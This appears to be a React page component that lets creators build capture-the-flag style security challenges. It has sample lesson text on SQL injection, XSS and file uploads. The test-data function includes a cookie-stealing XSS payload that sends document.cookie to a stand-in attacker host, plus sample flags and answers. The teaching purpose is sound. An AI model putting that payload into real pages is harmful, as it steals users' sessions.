import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { 
  Plus, Minus, Flag, AlertTriangle, Image, Upload, 
  Terminal, Shield, Lock, Target, Globe, Code,
  FileText, Clock, Users, Star, Eye, EyeOff, Save, 
  Send, ArrowRight, ArrowLeft, CheckCircle, Info, 
  ChevronDown, ChevronUp, Edit3, Hash, X, Zap
} from 'lucide-react';
import { ChallengeType, ChallengeDifficulty } from '../../lib/types';
import { createChallenge } from '../../lib/api';
import Card from '../../components/ui/Card';

interface Question {
  id: string;
  question_text: string;
  expected_answer: string;
  points: number;
  hints: string[];
}

interface TopicLabSettings {
  enabled: boolean;
  type: 'web' | 'docker';
  web_url?: string;
  web_instructions?: string;
  docker_image?: string;
  docker_command?: string;
}

interface Topic {
  id: string;
  title: string;
  description: string;
  explanation: string; // Rich content with images
  questions: Question[];
  expanded: boolean;
  lab_settings: TopicLabSettings; // Individual lab for each topic
}

interface ChallengeForm {
  // Basic Info
  title: string;
  short_description: string; // 50 chars max
  icon_url: string;
  category: ChallengeType;
  difficulty: ChallengeDifficulty;
  
  // Content
  topics: Topic[];
}

const CATEGORIES = [
  { id: 'web', label: 'Web Security', icon: Globe, color: 'text-accent-blue', desc: 'Web application vulnerabilities' },
  { id: 'network', label: 'Network Security', icon: Shield, color: 'text-accent-green', desc: 'Network protocols & analysis' },
  { id: 'crypto', label: 'Cryptography', icon: Lock, color: 'text-warning-light', desc: 'Encryption & cryptographic attacks' },
  { id: 'misc', label: 'Miscellaneous', icon: Target, color: 'text-primary', desc: 'OSINT, forensics & other topics' }
];

const DIFFICULTIES = [
  { id: 'easy', label: 'Easy', color: 'text-success-light', desc: 'Beginner friendly' },
  { id: 'medium', label: 'Medium', color: 'text-warning-light', desc: 'Intermediate level' },
  { id: 'hard', label: 'Hard', color: 'text-error-light', desc: 'Advanced techniques' },
  { id: 'expert', label: 'Expert', color: 'text-purple-400', desc: 'Expert level challenges' }
];

const CreateChallengePage = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const [formData, setFormData] = useState<ChallengeForm>({
    title: '',
    short_description: '',
    icon_url: '',
    category: '' as ChallengeType,
    difficulty: '' as ChallengeDifficulty,
    topics: [{
      id: '1',
      title: '',
      description: '',
      explanation: '',
      questions: [{
        id: '1-1',
        question_text: '',
        expected_answer: '',
        points: 10,
        hints: ['']
      }],
      expanded: true,
      lab_settings: {
        enabled: false,
        type: 'web'
      }
    }]
  });

  const handleBasicChange = (field: keyof ChallengeForm, value: any) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleShortDescChange = (value: string) => {
    if (value.length <= 50) {
      setFormData(prev => ({ ...prev, short_description: value }));
    }
  };

  // Topic Management
  const addTopic = () => {
    const newTopic: Topic = {
      id: Date.now().toString(),
      title: '',
      description: '',
      explanation: '',
      questions: [{
        id: `${Date.now()}-1`,
        question_text: '',
        expected_answer: '',
        points: 10,
        hints: ['']
      }],
      expanded: true,
      lab_settings: {
        enabled: false,
        type: 'web'
      }
    };
    setFormData(prev => ({
      ...prev,
      topics: [...prev.topics, newTopic]
    }));
  };

  const removeTopic = (topicId: string) => {
    if (formData.topics.length > 1) {
      setFormData(prev => ({
        ...prev,
        topics: prev.topics.filter(t => t.id !== topicId)
      }));
    }
  };

  const updateTopic = (topicId: string, field: keyof Topic, value: any) => {
    setFormData(prev => ({
      ...prev,
      topics: prev.topics.map(topic =>
        topic.id === topicId ? { ...topic, [field]: value } : topic
      )
    }));
  };

  const toggleTopicExpanded = (topicId: string) => {
    updateTopic(topicId, 'expanded', !formData.topics.find(t => t.id === topicId)?.expanded);
  };

  const updateTopicLabSettings = (topicId: string, labSettings: TopicLabSettings) => {
    setFormData(prev => ({
      ...prev,
      topics: prev.topics.map(topic =>
        topic.id === topicId ? { ...topic, lab_settings: labSettings } : topic
      )
    }));
  };

  // Question Management
  const addQuestion = (topicId: string) => {
    const topic = formData.topics.find(t => t.id === topicId);
    if (topic) {
      const newQuestion: Question = {
        id: `${topicId}-${topic.questions.length + 1}`,
        question_text: '',
        expected_answer: '',
        points: 10,
        hints: ['']
      };
      updateTopic(topicId, 'questions', [...topic.questions, newQuestion]);
    }
  };

  const removeQuestion = (topicId: string, questionId: string) => {
    const topic = formData.topics.find(t => t.id === topicId);
    if (topic && topic.questions.length > 1) {
      updateTopic(topicId, 'questions', topic.questions.filter(q => q.id !== questionId));
    }
  };

  const updateQuestion = (topicId: string, questionId: string, field: keyof Question, value: any) => {
    const topic = formData.topics.find(t => t.id === topicId);
    if (topic) {
      const updatedQuestions = topic.questions.map(q =>
        q.id === questionId ? { ...q, [field]: value } : q
      );
      updateTopic(topicId, 'questions', updatedQuestions);
    }
  };

  const addHint = (topicId: string, questionId: string) => {
    const topic = formData.topics.find(t => t.id === topicId);
    const question = topic?.questions.find(q => q.id === questionId);
    if (question) {
      updateQuestion(topicId, questionId, 'hints', [...question.hints, '']);
    }
  };

  const removeHint = (topicId: string, questionId: string, hintIndex: number) => {
    const topic = formData.topics.find(t => t.id === topicId);
    const question = topic?.questions.find(q => q.id === questionId);
    if (question && question.hints.length > 1) {
      const newHints = question.hints.filter((_, i) => i !== hintIndex);
      updateQuestion(topicId, questionId, 'hints', newHints);
    }
  };

  const updateHint = (topicId: string, questionId: string, hintIndex: number, value: string) => {
    const topic = formData.topics.find(t => t.id === topicId);
    const question = topic?.questions.find(q => q.id === questionId);
    if (question) {
      const newHints = question.hints.map((hint, i) => i === hintIndex ? value : hint);
      updateQuestion(topicId, questionId, 'hints', newHints);
    }
  };

  const totalSteps = 6; // Updated to include new steps

  // Test data function
  const loadTestData = () => {
    setFormData({
      title: 'Web Application Security Fundamentals',
      short_description: 'Learn web security through hands-on challenges',
      icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/480px-Google_%22G%22_logo.svg.png',
      category: 'web' as ChallengeType,
      difficulty: 'medium' as ChallengeDifficulty,
      topics: [
        {
          id: '1',
          title: 'SQL Injection Fundamentals',
          description: 'Learn the basics of SQL injection attacks',
          explanation: `# SQL Injection Fundamentals

SQL injection is one of the most common web application vulnerabilities. In this task, you'll learn how to identify and exploit SQL injection vulnerabilities.

![Web Application Screenshot](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1722450848675.png)

## What is SQL Injection?

SQL injection occurs when user input is not properly sanitized and is directly concatenated into SQL queries. This allows attackers to manipulate the SQL query structure.

## Common Attack Vectors

1. **Union-based injection** - Extract data using UNION statements
2. **Boolean-based blind** - Use boolean logic to extract data
3. **Time-based blind** - Use time delays to confirm vulnerabilities

## Tools Needed

- Burp Suite or OWASP ZAP
- Browser Developer Tools
- SQLMap (optional)`,
          questions: [
            {
              id: '1-1',
              question_text: 'What is the admin password found through SQL injection?',
              expected_answer: 'admin123',
              points: 20,
              hints: [
                'Try using a UNION SELECT statement',
                'Look for the users table'
              ]
            },
            {
              id: '1-2',
              question_text: 'How many users are in the database?',
              expected_answer: '5',
              points: 15,
              hints: [
                'Use COUNT(*) in your query',
                'Focus on the users table'
              ]
            }
          ],
          expanded: true,
          lab_settings: {
            enabled: true,
            type: 'web',
            web_url: 'http://sqli-lab.thm',
            web_instructions: 'Access the SQL injection lab to practice various injection techniques.'
          }
        },
        {
          id: '2',
          title: 'Cross-Site Scripting (XSS)',
          description: 'Understand and exploit XSS vulnerabilities',
          explanation: `# Cross-Site Scripting (XSS)

Cross-Site Scripting allows attackers to inject malicious scripts into web applications that are then executed in other users' browsers.

![XSS Example](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1722450848675.png)

## Types of XSS

1. **Stored XSS** - Script is permanently stored on the server
2. **Reflected XSS** - Script is reflected off the web server
3. **DOM-based XSS** - Vulnerability exists in client-side code

## Attack Payloads

Basic XSS payload:
\`\`\`javascript
<script>alert('XSS')</script>
\`\`\`

Cookie stealing payload:
\`\`\`javascript
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
\`\`\`

## Prevention

- Input validation and sanitization
- Content Security Policy (CSP)
- Output encoding`,
          questions: [
            {
              id: '2-1',
              question_text: 'What alert message appears when you execute the XSS payload?',
              expected_answer: 'XSS_FOUND',
              points: 25,
              hints: [
                'Try different XSS payloads in the input fields',
                'Check the contact form'
              ]
            },
            {
              id: '2-2',
              question_text: 'What is the session cookie value?',
              expected_answer: 'PHPSESSID=abc123def456',
              points: 30,
              hints: [
                'Use document.cookie in your XSS payload',
                'Check the browser developer tools'
              ]
            }
          ],
          expanded: true,
          lab_settings: {
            enabled: true,
            type: 'web',
            web_url: 'http://xss-lab.thm',
            web_instructions: 'Access the XSS lab to practice different types of cross-site scripting attacks.'
          }
        },
        {
          id: '3',
          title: 'File Upload Vulnerabilities',
          description: 'Learn about insecure file upload mechanisms',
          explanation: `# File Upload Vulnerabilities

File upload vulnerabilities occur when web applications allow users to upload files without proper validation and restrictions.

## Common Attack Vectors

1. **Executable file upload** - Upload PHP, JSP, ASP files
2. **Path traversal** - Upload files to arbitrary locations
3. **Content-Type bypass** - Manipulate MIME types
4. **Double extension** - file.php.jpg techniques

## Prevention

- Whitelist allowed file extensions
- Check file content, not just extension
- Store uploads outside web root
- Use antivirus scanning`,
          questions: [
            {
              id: '3-1',
              question_text: 'What is the flag after uploading a webshell?',
              expected_answer: 'THM{file_upload_pwned}',
              points: 35,
              hints: [
                'Try bypassing file extension filters',
                'Look for ways to execute uploaded files'
              ]
            }
          ],
          expanded: true,
          lab_settings: {
            enabled: true,
            type: 'docker',
            docker_image: 'vulnerableapp/fileupload:latest',
            docker_command: 'docker run -p 8080:80 vulnerableapp/fileupload:latest',
            web_instructions: 'Start the Docker container and access the file upload application on port 8080.'
          }
        }
      ]
    });

    // Show success message
    alert('Test data loaded! You can now see sample challenge content with 3 topics, each with individual lab environments.');
  };

  const handleSubmit = async () => {
    setError('');
    setLoading(true);

    // Validation
    if (!formData.title.trim()) {
      setError('Challenge title is required');
      setLoading(false);
      return;
    }

    if (!formData.short_description.trim()) {
      setError('Short description is required');
      setLoading(false);
      return;
    }

    if (!formData.category) {
      setError('Please select a category');
      setLoading(false);
      return;
    }

    if (!formData.difficulty) {
      setError('Please select difficulty level');
      setLoading(false);
      return;
    }

    // Validate topics
    for (const topic of formData.topics) {
      if (!topic.title.trim()) {
        setError('All topics must have a title');
        setLoading(false);
        return;
      }

      if (!topic.description.trim()) {
        setError('All topics must have a description');
        setLoading(false);
        return;
      }

      for (const question of topic.questions) {
        if (!question.question_text.trim()) {
          setError('All questions must have question text');
          setLoading(false);
          return;
        }

        if (!question.expected_answer.trim()) {
          setError('All questions must have an expected answer');
          setLoading(false);
          return;
        }
      }

      // Validate lab settings
      if (topic.lab_settings.enabled) {
        if (topic.lab_settings.type === 'web' && !topic.lab_settings.web_url?.trim()) {
          setError(`Topic "${topic.title}" has web lab enabled but no URL provided`);
          setLoading(false);
          return;
        }
        if (topic.lab_settings.type === 'docker' && !topic.lab_settings.docker_image?.trim()) {
          setError(`Topic "${topic.title}" has Docker lab enabled but no image provided`);
          setLoading(false);
          return;
        }
      }
    }

    try {
      // Convert to API format
      const challengeData = {
        title: formData.title,
        description: formData.short_description,
        short_description: formData.short_description,
        challenge_type: formData.category,
        difficulty: formData.difficulty,
        icon_url: formData.icon_url || undefined,
        status: 'pending' as const,
        
        // Convert topics to questions for backward compatibility
        questions: formData.topics.flatMap(topic =>
          topic.questions.map((question, qIndex) => ({
            question: question.question_text,
            description: `${topic.title} - ${topic.description}${topic.questions.length > 1 ? ` (Question ${qIndex + 1})` : ''}`,
            flag: question.expected_answer,
            points: Math.min(Math.max(Math.round(question.points / 10), 1), 5),
            hints: question.hints.filter(h => h.trim()),
            solution_explanation: topic.explanation,
            difficulty_rating: formData.difficulty === 'easy' ? 1 : formData.difficulty === 'medium' ? 2 : formData.difficulty === 'hard' ? 4 : 5
          }))
        ),

        // Store enhanced structure with individual lab settings per topic
        tasks: formData.topics.map(topic => ({
          id: topic.id,
          title: topic.title,
          description: topic.description,
          explanation: topic.explanation,
          questions: topic.questions.map(q => ({
            id: q.id,
            question_text: q.question_text,
            expected_answer: q.expected_answer,
            answer_validation: 'exact' as const,
            case_sensitive: false,
            points: Math.min(Math.max(q.points, 1), 100),
            hints: q.hints.map(hint => ({
              text: hint,
              unlock_after_attempts: 2
            })),
            question_type: 'text' as const
          })),
          attachments: [],
          // Individual lab environment for each topic
          lab_environment: topic.lab_settings.enabled ? {
            enabled: true,
            lab_type: topic.lab_settings.type === 'web' ? 'web_app' as const : 'docker' as const,
            web_app_url: topic.lab_settings.web_url,
            docker_image: topic.lab_settings.docker_image,
            setup_instructions: topic.lab_settings.web_instructions || '',
            vpn_required: false,
            attackbox_required: false,
            ports: topic.lab_settings.type === 'web' ? ['80', '443'] : ['8080'],
            requirements: [],
            duration: 60,
            spawn_per_task: true
          } : { enabled: false }
        })),

        // Global lab environment (disabled since we're using per-topic labs)
        lab_environment: { enabled: false }
      };

      const result = await createChallenge(challengeData);
      
      if (!result.success) {
        throw new Error(result.error || 'Failed to create challenge');
      }

      alert('Challenge/Module created successfully!');
      navigate('/creator/manage');
    } catch (err) {
      console.error('Error creating challenge:', err);
      setError(`Failed to create challenge: ${err instanceof Error ? err.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background-dark">
      {/* Header */}
      <div className="bg-background-default border-b border-background-light">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-white mb-2 flex items-center">
                <Target className="h-8 w-8 mr-3 text-primary" />
                Create Challenge/Module
              </h1>
              <p className="text-gray-400">Create Challenges and Module For the Community</p>
            </div>
            <div className="flex items-center gap-4">
              <button
                onClick={loadTestData}
                className="btn-outline flex items-center text-accent-blue border-accent-blue hover:bg-accent-blue/10"
              >
                <Zap className="h-4 w-4 mr-2" />
                Load Test Data
              </button>
              <button
                onClick={() => navigate('/creator/manage')}
                className="btn-outline"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {error && (
          <div className="mb-6 p-4 bg-error-dark/20 border border-error-light/30 rounded-lg text-error-light flex items-center">
            <AlertTriangle className="h-5 w-5 mr-2 flex-shrink-0" />
            {error}
          </div>
        )}

        <div className="space-y-8">
          {/* Basic Information */}
          <Card className="p-6">
            <h2 className="text-xl font-bold text-white mb-6 flex items-center">
              <Info className="h-5 w-5 mr-2 text-primary" />
              Basic Information
            </h2>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="space-y-4">
                <div>
                  <label className="form-label">Challenge/Module Name *</label>
                  <input
                    type="text"
                    value={formData.title}
                    onChange={(e) => handleBasicChange('title', e.target.value)}
                    className="form-input"
                    placeholder="e.g., Web Application Fundamentals"
                  />
                </div>

                <div>
                  <label className="form-label">
                    Short Description * 
                    <span className="text-sm text-gray-400 ml-2">
                      ({formData.short_description.length}/50)
                    </span>
                  </label>
                  <input
                    type="text"
                    value={formData.short_description}
                    onChange={(e) => handleShortDescChange(e.target.value)}
                    className="form-input"
                    placeholder="Brief description for the challenge card"
                    maxLength={50}
                  />
                </div>

                <div>
                  <label className="form-label">Icon URL</label>
                  <input
                    type="url"
                    value={formData.icon_url}
                    onChange={(e) => handleBasicChange('icon_url', e.target.value)}
                    className="form-input"
                    placeholder="https://example.com/challenge-icon.png"
                  />
                </div>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="form-label">Category *</label>
                  <div className="grid grid-cols-1 gap-2">
                    {CATEGORIES.map(category => (
                      <button
                        key={category.id}
                        type="button"
                        onClick={() => handleBasicChange('category', category.id)}
                        className={`p-3 rounded-lg border text-left transition-all ${
                          formData.category === category.id
                            ? 'border-primary bg-primary/10 text-primary'
                            : 'border-background-light hover:border-gray-600'
                        }`}
                      >
                        <div className="flex items-center">
                          <category.icon className={`h-5 w-5 mr-3 ${category.color}`} />
                          <div>
                            <div className="font-medium text-white">{category.label}</div>
                            <div className="text-sm text-gray-400">{category.desc}</div>
                          </div>
                        </div>
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="form-label">Difficulty *</label>
                  <div className="grid grid-cols-2 gap-2">
                    {DIFFICULTIES.map(difficulty => (
                      <button
                        key={difficulty.id}
                        type="button"
                        onClick={() => handleBasicChange('difficulty', difficulty.id)}
                        className={`p-3 rounded-lg border text-center transition-all ${
                          formData.difficulty === difficulty.id
                            ? 'border-primary bg-primary/10 text-primary'
                            : 'border-background-light hover:border-gray-600'
                        }`}
                      >
                        <div className={`font-bold ${difficulty.color}`}>{difficulty.label}</div>
                        <div className="text-xs text-gray-400">{difficulty.desc}</div>
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </Card>

          {/* Topics */}
          <Card className="p-6">
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-bold text-white flex items-center">
                <FileText className="h-5 w-5 mr-2 text-primary" />
                Topics/Modules
              </h2>
              <button
                onClick={addTopic}
                className="btn-primary flex items-center"
              >
                <Plus className="h-4 w-4 mr-2" />
                Add Topic
              </button>
            </div>

            <div className="space-y-4">
              {formData.topics.map((topic, topicIndex) => (
                <Card key={topic.id} className="p-4 bg-background-light border border-primary/20">
                  <div className="flex items-center justify-between mb-4">
                    <button
                      onClick={() => toggleTopicExpanded(topic.id)}
                      className="flex items-center text-lg font-bold text-white hover:text-primary transition-colors"
                    >
                      {topic.expanded ? <ChevronUp className="h-5 w-5 mr-2" /> : <ChevronDown className="h-5 w-5 mr-2" />}
                      Topic {topicIndex + 1}: {topic.title || 'Untitled Topic'}
                      <span className="ml-3 text-sm text-gray-400">
                        ({topic.questions.length} question{topic.questions.length !== 1 ? 's' : ''})
                      </span>
                      {topic.lab_settings.enabled && (
                        <span className="ml-2 px-2 py-1 bg-accent-blue/20 text-accent-blue text-xs rounded-full border border-accent-blue/30">
                          Lab Enabled
                        </span>
                      )}
                    </button>
                    
                    {formData.topics.length > 1 && (
                      <button
                        onClick={() => removeTopic(topic.id)}
                        className="text-error-light hover:text-error-light/80"
                      >
                        <X className="h-5 w-5" />
                      </button>
                    )}
                  </div>

                  {topic.expanded && (
                    <div className="space-y-6">
                      {/* Topic Basic Info */}
                      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                        <div>
                          <label className="form-label">Topic Title *</label>
                          <input
                            type="text"
                            value={topic.title}
                            onChange={(e) => updateTopic(topic.id, 'title', e.target.value)}
                            className="form-input"
                            placeholder="e.g., SQL Injection Basics"
                          />
                        </div>
                        
                        <div>
                          <label className="form-label">Short Description *</label>
                          <input
                            type="text"
                            value={topic.description}
                            onChange={(e) => updateTopic(topic.id, 'description', e.target.value)}
                            className="form-input"
                            placeholder="Brief overview of this topic"
                          />
                        </div>
                      </div>

                      {/* Topic Explanation */}
                      <div>
                        <label className="form-label">
                          Topic Explanation/Content 
                          <span className="text-sm text-gray-400 ml-2">(You can include image URLs in the text)</span>
                        </label>
                        <textarea
                          value={topic.explanation}
                          onChange={(e) => updateTopic(topic.id, 'explanation', e.target.value)}
                          rows={6}
                          className="form-input font-mono"
                          placeholder="Detailed explanation of the topic. Include concepts, methodology, tools needed, etc.&#10;&#10;You can include images like:&#10;![Image description](https://example.com/image.png)&#10;&#10;Or reference code blocks, techniques, and step-by-step guides..."
                        />
                        <p className="text-xs text-gray-400 mt-1">
                          Tip: Write detailed explanations for the rooms. Include learning materials, examples, and guidance.
                        </p>
                      </div>

                      {/* Topic Lab Environment */}
                      <div className="border-t border-gray-600 pt-6">
                        <h4 className="text-lg font-bold text-white mb-4 flex items-center">
                          <Terminal className="h-5 w-5 mr-2 text-accent-green" />
                          Lab Environment (Optional)
                        </h4>

                        <div className="space-y-4">
                          <div className="flex items-center">
                            <input
                              type="checkbox"
                              id={`lab-enabled-${topic.id}`}
                              checked={topic.lab_settings.enabled}
                              onChange={(e) => updateTopicLabSettings(topic.id, { 
                                ...topic.lab_settings, 
                                enabled: e.target.checked 
                              })}
                              className="mr-3"
                            />
                            <label htmlFor={`lab-enabled-${topic.id}`} className="text-white font-medium">
                              Enable Lab Environment for this Topic
                            </label>
                          </div>

                          {topic.lab_settings.enabled && (
                            <div className="space-y-4 pl-6 border-l-2 border-accent-green/30">
                              <div className="grid grid-cols-2 gap-4">
                                <button
                                  type="button"
                                  onClick={() => updateTopicLabSettings(topic.id, { 
                                    ...topic.lab_settings, 
                                    type: 'web' 
                                  })}
                                  className={`p-4 rounded-lg border text-center transition-all ${
                                    topic.lab_settings.type === 'web'
                                      ? 'border-accent-blue bg-accent-blue/10 text-accent-blue'
                                      : 'border-background-light hover:border-gray-600'
                                  }`}
                                >
                                  <Globe className="h-6 w-6 mx-auto mb-2 text-accent-blue" />
                                  <div className="font-medium">Web Lab</div>
                                  <div className="text-sm text-gray-400">Hosted web application</div>
                                </button>

                                <button
                                  type="button"
                                  onClick={() => updateTopicLabSettings(topic.id, { 
                                    ...topic.lab_settings, 
                                    type: 'docker' 
                                  })}
                                  className={`p-4 rounded-lg border text-center transition-all ${
                                    topic.lab_settings.type === 'docker'
                                      ? 'border-accent-green bg-accent-green/10 text-accent-green'
                                      : 'border-background-light hover:border-gray-600'
                                  }`}
                                >
                                  <Terminal className="h-6 w-6 mx-auto mb-2 text-accent-green" />
                                  <div className="font-medium">Docker Lab</div>
                                  <div className="text-sm text-gray-400">Container environment</div>
                                </button>
                              </div>

                              {topic.lab_settings.type === 'web' && (
                                <div className="space-y-4">
                                  <div>
                                    <label className="form-label">Web Application URL *</label>
                                    <input
                                      type="url"
                                      value={topic.lab_settings.web_url || ''}
                                      onChange={(e) => updateTopicLabSettings(topic.id, { 
                                        ...topic.lab_settings, 
                                        web_url: e.target.value 
                                      })}
                                      className="form-input"
                                      placeholder="https://vulnerable-app.example.com"
                                    />
                                  </div>

                                  <div>
                                    <label className="form-label">Lab Instructions</label>
                                    <textarea
                                      value={topic.lab_settings.web_instructions || ''}
                                      onChange={(e) => updateTopicLabSettings(topic.id, { 
                                        ...topic.lab_settings, 
                                        web_instructions: e.target.value 
                                      })}
                                      rows={3}
                                      className="form-input"
                                      placeholder="Instructions for accessing and using this lab environment..."
                                    />
                                  </div>
                                </div>
                              )}

                              {topic.lab_settings.type === 'docker' && (
                                <div className="space-y-4">
                                  <div>
                                    <label className="form-label">Docker Image *</label>
                                    <input
                                      type="text"
                                      value={topic.lab_settings.docker_image || ''}
                                      onChange={(e) => updateTopicLabSettings(topic.id, { 
                                        ...topic.lab_settings, 
                                        docker_image: e.target.value 
                                      })}
                                      className="form-input font-mono"
                                      placeholder="vulnerableapp/sqli:latest"
                                    />
                                  </div>

                                  <div>
                                    <label className="form-label">Docker Command</label>
                                    <input
                                      type="text"
                                      value={topic.lab_settings.docker_command || ''}
                                      onChange={(e) => updateTopicLabSettings(topic.id, { 
                                        ...topic.lab_settings, 
                                        docker_command: e.target.value 
                                      })}
                                      className="form-input font-mono"
                                      placeholder="docker run -p 8080:80 vulnerableapp/sqli:latest"
                                    />
                                  </div>

                                  <div>
                                    <label className="form-label">Lab Instructions</label>
                                    <textarea
                                      value={topic.lab_settings.web_instructions || ''}
                                      onChange={(e) => updateTopicLabSettings(topic.id, { 
                                        ...topic.lab_settings, 
                                        web_instructions: e.target.value 
                                      })}
                                      rows={3}
                                      className="form-input"
                                      placeholder="Instructions for starting and using this Docker lab environment..."
                                    />
                                  </div>
                                </div>
                              )}
                            </div>
                          )}
                        </div>
                      </div>

                      {/* Questions */}
                      <div className="space-y-4">
                        <div className="flex items-center justify-between">
                          <h4 className="font-bold text-white flex items-center">
                            <Hash className="h-4 w-4 mr-2 text-accent-blue" />
                            Questions
                          </h4>
                          <button
                            onClick={() => addQuestion(topic.id)}
                            className="btn-outline flex items-center"
                          >
                            <Plus className="h-4 w-4 mr-2" />
                            Add Question
                          </button>
                        </div>

                        {topic.questions.map((question, questionIndex) => (
                          <Card key={question.id} className="p-4 bg-background-default border border-accent-blue/10">
                            <div className="flex items-center justify-between mb-3">
                              <h5 className="font-medium text-accent-blue">Question {questionIndex + 1}</h5>
                              {topic.questions.length > 1 && (
                                <button
                                  onClick={() => removeQuestion(topic.id, question.id)}
                                  className="text-error-light hover:text-error-light/80"
                                >
                                  <Minus className="h-4 w-4" />
                                </button>
                              )}
                            </div>

                            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                              <div className="space-y-3">
                                <div>
                                  <label className="form-label">Question Text *</label>
                                  <input
                                    type="text"
                                    value={question.question_text}
                                    onChange={(e) => updateQuestion(topic.id, question.id, 'question_text', e.target.value)}
                                    className="form-input"
                                    placeholder="What is the flag in the admin panel?"
                                  />
                                </div>

                                <div>
                                  <label className="form-label">Expected Answer *</label>
                                  <input
                                    type="text"
                                    value={question.expected_answer}
                                    onChange={(e) => updateQuestion(topic.id, question.id, 'expected_answer', e.target.value)}
                                    className="form-input font-mono"
                                    placeholder="THM{hidden_flag_here}"
                                  />
                                </div>

                                <div>
                                  <label className="form-label">Points</label>
                                  <input
                                    type="number"
                                    min="10"
                                    max="50"
                                    step="10"
                                    value={question.points}
                                    onChange={(e) => updateQuestion(topic.id, question.id, 'points', parseInt(e.target.value) || 10)}
                                    className="form-input"
                                  />
                                  <p className="text-xs text-gray-400 mt-1">
                                    Points will be scaled to 1-5 for database storage
                                  </p>
                                </div>
                              </div>

                              <div>
                                <label className="form-label">Hints</label>
                                {question.hints.map((hint, hintIndex) => (
                                  <div key={hintIndex} className="flex gap-2 mb-2">
                                    <input
                                      type="text"
                                      value={hint}
                                      onChange={(e) => updateHint(topic.id, question.id, hintIndex, e.target.value)}
                                      className="form-input flex-1"
                                      placeholder="Helpful hint for participants"
                                    />
                                    {question.hints.length > 1 && (
                                      <button
                                        onClick={() => removeHint(topic.id, question.id, hintIndex)}
                                        className="text-error-light hover:text-error-light/80"
                                      >
                                        <Minus className="h-5 w-5" />
                                      </button>
                                    )}
                                  </div>
                                ))}
                                <button
                                  onClick={() => addHint(topic.id, question.id)}
                                  className="btn-outline flex items-center text-sm"
                                >
                                  <Plus className="h-4 w-4 mr-1" />
                                  Add Hint
                                </button>
                              </div>
                            </div>
                          </Card>
                        ))}
                      </div>
                    </div>
                  )}
                </Card>
              ))}
            </div>
          </Card>

          {/* Submit */}
          <div className="flex justify-between items-center pt-6">
            <button
              onClick={() => navigate('/creator/manage')}
              className="btn-outline"
            >
              Cancel
            </button>

            <button
              onClick={handleSubmit}
              disabled={loading}
              className="btn-primary flex items-center"
            >
              <Send className="h-5 w-5 mr-2" />
              {loading ? 'Creating...' : 'Create Challenge/Module'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CreateChallengePage;